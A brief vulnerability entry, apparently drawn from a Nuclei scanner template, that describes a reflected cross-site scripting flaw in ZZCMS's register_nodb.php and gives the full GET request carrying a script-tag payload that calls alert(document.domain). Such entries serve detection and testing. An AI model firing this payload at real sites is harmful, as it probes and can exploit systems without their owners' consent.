# Vulnerability: Zzcms `register_nodb.php` - Cross Site Scripting
**Classification:** XSS
**Source:** Nuclei Template (`zzcms-register-xss.yaml`)

## Description
Identified a reflected Cross-Site Scripting (XSS) vulnerability in register_nodb.php of ZZCMS, which allowed injection of malicious scripts via user-supplied input.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/3/ucenter_api/code/register_nodb.php/"><script>alert(document.domain)</script>
```

